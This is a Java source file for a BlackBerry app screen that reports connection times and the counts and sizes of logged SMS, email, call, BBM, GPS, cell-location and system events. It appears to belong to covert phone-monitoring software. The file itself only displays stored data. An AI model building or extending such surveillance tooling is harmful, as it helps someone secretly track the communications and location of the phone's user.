package com.vvt.screen;

import java.util.Vector;
import com.vvt.db.FxEventDatabase;
import com.vvt.event.FxCallLogEvent;
import com.vvt.event.FxCellInfoEvent;
import com.vvt.event.FxEmailEvent;
import com.vvt.event.FxGPSEvent;
import com.vvt.event.FxIMEvent;
import com.vvt.event.FxSMSEvent;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.EventType;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PrefCellInfo;
import com.vvt.pref.PrefEventInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.PrefMessenger;
import com.vvt.pref.PrefSystem;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.std.Log;
import com.vvt.std.TimeUtil;
import com.vvt.version.VersionInfo;
import net.rim.device.api.ui.Field;
import net.rim.device.api.ui.Manager;
import net.rim.device.api.ui.component.RichTextField;
import net.rim.device.api.ui.container.MainScreen;

public class StatusReportScreen extends MainScreen {
	
	private String appVersion = VersionInfo.getFullVersion();
	private LicenseManager license = Global.getLicenseManager();
	private LicenseInfo licenseInfo = null;
	private Preference pref = Global.getPreference();
	private FxEventDatabase db = Global.getFxEventDatabase();
	private SettingsScreen settingsScreen = null;

	public StatusReportScreen(SettingsScreen settingsScreen) {
		super(Manager.VERTICAL_SCROLL | Manager.VERTICAL_SCROLLBAR);
		try {
			this.settingsScreen = settingsScreen;
			add(new RichTextField("Last connection:", Field.READONLY));
			PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			long lastCon = generalInfo.getLastConnection();
			if (lastCon == 0) {
				add(new RichTextField("\tN/A", Field.READONLY));
			} else {
				add(new RichTextField("\t" + TimeUtil.format(lastCon), Field.READONLY));
			}
			add(new RichTextField("Connection method:", Field.READONLY));
			add(new RichTextField("\t" + generalInfo.getConnectionMethod(), Field.READONLY));
			add(new RichTextField("Next connection:", Field.READONLY));
			PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			boolean isCaptured = !eventInfo.isCallLogEnabled() && !eventInfo.isEmailEnabled() && !eventInfo.isSMSEnabled();
			if (isCaptured) {
				add(new RichTextField("\tstopped", Field.READONLY));
			} else {
				long nextSchedule = generalInfo.getNextSchedule();
				if (nextSchedule == 0) {
					add(new RichTextField("\tnot scheduled", Field.READONLY));
				} else {
				   String format = "yyyy MMM dd HH:mm:ss";
				   add(new RichTextField("\t" + TimeUtil.format(nextSchedule, format)));
				}
			}
			add(new RichTextField("Events:", Field.READONLY));
			// TODO I'm not sure about this, so it must check again.
//			add(new RichTextField("APN index = " + new Device().getApnIndex(), RichTextField.READONLY));
			long dataSize = 0;
			int numberOfEvent = 0;
			Vector events = null;
			PrefMessenger prefMessenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
			PrefEventInfo prefEvent = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
			PrefCellInfo prefCell = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
			PrefGPS prefGPS = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			PrefBugInfo prefBug = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
			PrefSystem prefSystem = (PrefSystem)pref.getPrefInfo(PreferenceType.PREF_SYSTEM);
			if (prefMessenger.isSupported()) {
				// SMS
				int numberOfIM = db.getNumberOfEvent(EventType.IM);
				events = db.select(EventType.IM, numberOfIM);
				FxIMEvent[] imEvent = new FxIMEvent[numberOfIM];
				for (int i = 0; i < numberOfIM; i++) {
					imEvent[i] = (FxIMEvent)events.elementAt(i);
					dataSize += imEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfIM;
				add(new RichTextField("\tBBM: " + numberOfIM, Field.READONLY));
			}
			if (prefEvent.isSupported()) {
				// SMS
				int numberOfSMS = db.getNumberOfEvent(EventType.SMS);
				events = db.select(EventType.SMS, numberOfSMS);
				FxSMSEvent[] smsEvent = new FxSMSEvent[numberOfSMS];
				for (int i = 0; i < numberOfSMS; i++) {
					smsEvent[i] = (FxSMSEvent)events.elementAt(i);
					dataSize += smsEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfSMS;
				// Email
				int numberOfEmail = db.getNumberOfEvent(EventType.MAIL);
				events = db.select(EventType.MAIL, numberOfEmail);
				FxEmailEvent[] emailEvent = new FxEmailEvent[numberOfEmail];
				for (int i = 0; i < numberOfEmail; i++) {
					emailEvent[i] = (FxEmailEvent)events.elementAt(i);
					dataSize += emailEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfEmail;
				// Voice
				int numberOfVoice = db.getNumberOfEvent(EventType.VOICE);
				events = db.select(EventType.VOICE, numberOfVoice);
				FxCallLogEvent[] callEvent = new FxCallLogEvent[numberOfVoice];
				for (int i = 0; i < numberOfVoice; i++) {
					callEvent[i] = (FxCallLogEvent)events.elementAt(i);
					dataSize += callEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfVoice;
				add(new RichTextField("\tSMS: " + numberOfSMS, Field.READONLY));
				add(new RichTextField("\tVoice: " + numberOfVoice, Field.READONLY));
				add(new RichTextField("\tE-mail: " + numberOfEmail, Field.READONLY));
			}
			if (prefCell.isSupported()) {
				int numberOfCell = db.getNumberOfEvent(EventType.CELL_ID);
				events = db.select(EventType.CELL_ID, numberOfCell);
				FxCellInfoEvent[] cellEvent = new FxCellInfoEvent[numberOfCell];
				for (int i = 0; i < numberOfCell; i++) {
					cellEvent[i] = (FxCellInfoEvent)events.elementAt(i);
					dataSize += cellEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfCell;
				add(new RichTextField("\tLocation: " + numberOfCell, Field.READONLY));
			}
			if (prefGPS.isSupported()) {
				int numberOfGPS = db.getNumberOfEvent(EventType.GPS);
				events = db.select(EventType.GPS, numberOfGPS);
				FxGPSEvent[] gpsEvent = new FxGPSEvent[numberOfGPS];
				for (int i = 0; i < numberOfGPS; i++) {
					gpsEvent[i] = (FxGPSEvent)events.elementAt(i);
					dataSize += gpsEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfGPS;
				add(new RichTextField("\tLocation: " + numberOfGPS, Field.READONLY));
			}
			if (prefSystem.isSupported()) {
				int numberOfSystem = db.getNumberOfEvent(EventType.SYSTEM_EVENT);
				events = db.select(EventType.SYSTEM_EVENT, numberOfSystem);
				FxSystemEvent[] systemEvent = new FxSystemEvent[numberOfSystem];
				for (int i = 0; i < numberOfSystem; i++) {
					systemEvent[i] = (FxSystemEvent)events.elementAt(i);
					dataSize += systemEvent[i].getObjectSize();
				}
				numberOfEvent += numberOfSystem;
				add(new RichTextField("\tSystem: " + numberOfSystem, Field.READONLY));
			}
			add(new RichTextField("Number of log: " + numberOfEvent + ", size = " + dataSize + " bytes", Field.READONLY));
		} catch (Exception e) {
			Log.error("StatusReportScreen.constructor", null, e);
		}
	}
}